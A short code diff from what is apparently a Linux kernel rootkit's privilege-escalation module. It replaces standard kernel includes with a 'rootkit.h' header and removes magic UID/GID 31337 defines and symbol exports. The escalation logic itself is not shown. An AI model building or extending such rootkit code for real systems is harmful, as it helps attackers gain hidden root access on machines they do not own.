@@ -1,25 +1,11 @@
 /*
- * Advanced Privilege Escalation Implementation
- * Provides multiple methods for privilege escalation
- * Kernel Version: 5.15.142
+ * Privilege Escalation Implementation
+ * Advanced techniques for elevating process privileges
  */
 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/cred.h>
-#include <linux/uidgid.h>
-#include <linux/sched.h>
-#include <linux/syscalls.h>
-#include <linux/uaccess.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/security.h>
+#include "rootkit.h"
 #include <linux/capability.h>
-#include <linux/rcupdate.h>
-#include <linux/slab.h>
-
-#define MAGIC_UID 31337
-#define MAGIC_GID 31337
+#include <linux/security.h>
 #define ROOT_UID 0
 #define ROOT_GID 0
 
@@ -407,8 +393,4 @@ void cleanup_privilege_escalation(void) {
 }
 
 // 导出符号
-EXPORT_SYMBOL(escalate_privileges);
-EXPORT_SYMBOL(escalate_process_group);
-EXPORT_SYMBOL(get_escalation_stats);
-EXPORT_SYMBOL(init_privilege_escalation);
-EXPORT_SYMBOL(cleanup_privilege_escalation);
+// Functions are part of the same module, no need to export
